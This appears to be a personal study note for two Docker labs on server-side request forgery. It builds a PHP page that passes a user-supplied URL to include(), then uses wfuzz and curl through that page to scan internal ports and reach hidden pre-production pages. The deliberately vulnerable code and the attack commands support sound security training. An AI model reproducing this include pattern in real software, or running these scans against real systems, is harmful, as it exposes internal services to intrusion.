# Definition
Something to do!!
# Laboratory 1
## Laboratory Setup
We will use this **Environment** plotted with Excalidraw.
![[Pasted image 20230718185053.png]]
___
We are going to build our environment with docker machines.
```shell
docker pull ubuntu:latest
docker run -dit --name ssrf_lab1 <image_ID>
docker exec -it ssrf_lab1 bash
```
___
Now, inside **ssrf_lab1** machine.
```shell
apt update
apt install apache2 php nano python3 lsof vim -y
service apache2 start
```
![[Pasted image 20230718174440.png]]
___
After, we have to enable **url_include** feature at **/etc/php/8.1/apache2/php.ini**.
![[Pasted image 20230718175556.png]]
```shell
service apache2 restart
```
___
Then, we will use *utility.php* rather than *index.html* to manage URL inclusions.
```shell
cd /var/www/html
rm index.html
vim utility.php
```
Also, we will verify if the URL has been sent.
```php
<?php 
        if (isset($_GET['url'])) { 
                $url = $_GET['url']; 
                echo "\n[+] Listing web content: " . $url . "\n\n"; 
                include($url); 
        } else { 
                echo "\n[!] URL not provided\n\n"; 
        } 
?>
```
___
Now, we should see something like this.
![[Pasted image 20230718181027.png]]
___
Well, as we will have **2** websites deployed: *PRODUCTION* and *PRE-PRODUCTION*. Let's asumming that the system has a login page.
*login.php* of **PRODUCTION** at **/var/www/html/**.
```php
<!DOCTYPE html>
<html>
<head>
  <title>Formulario de Inicio de Sesión</title>
</head>
<body>

<h2>Inicio de Sesión</h2>

<form action="login.php" method="POST">
  <div>
    <label for="username">Usuario:</label>
    <input type="text" id="username" name="username" required>
  </div>
  <div>
    <label for="password">Contraseña:</label>
    <input type="password" id="password" name="password" required>
  </div>
  <div>
    <input type="submit" value="Iniciar Sesión">
  </div>
</form>

</body>
</html>
```
___
Also, we have login page on *PRE-PRODUCTION* that shows *credentials* that also works with *PRODUCTIOIN*, like this.
*login.php* of **PRE-PRODUCTION** at **/tmp/**.
```php
<!DOCTYPE html>
<html>
<head>
  <title>Formulario de Inicio de Sesión</title>
</head>
<body>

<h2>Inicio de Sesión</h2>

<form action="login.php" method="POST">
  <div>
    <label>To test use this credentials: administrator/admin$_p1a2s3s$ (it works with PRODUCTION as well)</label><br><br>
    <label for="username">Usuario:</label>
    <input type="text" id="username" name="username" required>
  </div>
  <div>
    <label for="password">Contraseña:</label>
    <input type="password" id="password" name="password" required>
  </div>
  <div>
    <input type="submit" value="Iniciar Sesión">
  </div>
</form>

</body>
</html>
```
___
Now, to deploy *PRE-PRODUCTION* website we should use *python* to create a *HTTP* server on port **4646** at **/tmp/**.
```python
python3 -m http.server 4646
```
Right now, *PRE-PRODUCTION* is reachable by *Attacker machine*.
![[Pasted image 20230718185152.png]]
![[Pasted image 20230718183822.png]]
___
But, using **--bind 127.0.0.1** we can blind it to its *localhost*.
```python
python3 -m http.server 4646 --bind 127.0.0.1
```
![[Pasted image 20230718183926.png]]
___
Doing a Nmap scanning, we retreived the same output.
![[Pasted image 20230718184243.png]]
___
## Attacking
Well, we could start using **URL** field of *PRODUCTION* website to scan ports with [[Wfuzz]] tool.
```shell
wfuzz -c -t 200 -z range,1-65535 "http://172.17.0.2/utility.php?url=http://127.0.0.1:FUZZ"
```
![[Pasted image 20230718190323.png]]
___
You can see that there is a lot of *3* as *Lines*, let's try avoid it.
```shell
wfuzz -c --hl=3 -t 200 -z range,1-65535 "http://172.17.0.2/utility.php?url=http://127.0.0.1:FUZZ"
```
![[Pasted image 20230718190943.png]]
___
And now, we can see the *login.php* page from *PRE-PRODUCTION* by using **utility.php** seen before to *include* the *PRE-PRODUCTION* URL.
![[Pasted image 20230718184755.png]]
___
![[Pasted image 20230718185644.png]]
___
# Laboratory 2
You will not always see this type of scenario, many times the *PRE-PRODUCTION* website will be on another machine, but on the same network so it can communicate with the *PRODUCTION* website.
## Laboratory Setup
This Excalidraw graphic shows our laboratory.
![[Pasted image 20230718193218.png]]
___
We should remove before docker processes.
```shell
docker rm $(docker ps -a -q) --force
```
___
### Configuring Attacker Machine
We are going to leverage the *Ubuntu* docker image created earlier.
```shell
docker run -dit --name ATTACKER <image_ID>
docker exec -it ATTACKER bash
```
___
as **ATTACKER**.
```shell
hostname -I
```
![[Pasted image 20230718194206.png]]
___
### Configuring PRODUCTION Machine
As both *PRODUCTION* and *PRE-PRODUCTION* belong **10.10.0.0** subnet, we have to create this subnet in docker.
```shell
docker network create --driver=bridge NET1 --subnet=10.10.0.0/24
```
![[Pasted image 20230718194826.png]]
___
We are going to deploy the machine leveraging the *Ubuntu* docker image created earlier.
```shell
docker run -dit --name PRODUCTION <image_ID>
```
___
Well, specifically this machine should have **2** network interfaces. Thus, we are going to **ADD** the *NET1* interface created earlier to this machine.
```shell
docker network connect NET1 PRODUCTION
```
![[Pasted image 20230718195945.png]]
___
Now, we have to configure the website like **Laboratory 1**.
Inside **PRODUCTION** machine.
```shell
apt update
apt install apache2 php vim -y
```
___
Then, we are going to remove *index.html* at **/var/www/html/** and create *utility.php*.
```shell
rm /var/www/html/index.html
vim /var/www/html/utility.php
```
*utility.php* has the same code seen at **Laboratory 1**.
___
Finally, we have to enable **url_include** feature at **/etc/php/8.1/apache2/php.ini** like **Labortatory 1** and then start the *apache* service.
```shell
service apache2 start
```
___
### Configuring PRE-PRODUCTION Machine
*PRE-PRODUCTION* only belongs to the **10.10.0.0** subnet, we have to deploy this machine but only using **NET1** interface.
```shell
docker run -dit --name PRE_PRODUCTION --network=NET1 <image_ID>
```
![[Pasted image 20230718202042.png]]
___
Now, we have to configure the website like **Laboratory 1**.
Inside **PRE-PRODUCTION** machine.
```shell
apt update
apt install vim python3 -y
```
___
Then, we are going to create a *index.html* at **/tmp/**.
*index.html*.
```html
<h1>
        You shouldn't see this content, this PRE-PRODUCTION website contains sensitive data
</h1>
```
___
Finally, we have to deploy this machine by using python at **/tmp/**.
```shell
python3 -m http.server 7878
```
___
## Attacking
And now, from **ATTACKER** machine you can't directly see the content of **PRE-PRODUCTION**.
```shell
apt update
apt install curl -y
curl -s -X GET "http://10.10.0.3:7878/index.html"
```
![[Pasted image 20230718203308.png]]
___
But, using a SSRF on **PRODUCTION** machine, we can do it.
![[Pasted image 20230718203359.png]]
___
![[Pasted image 20230718204119.png]]
___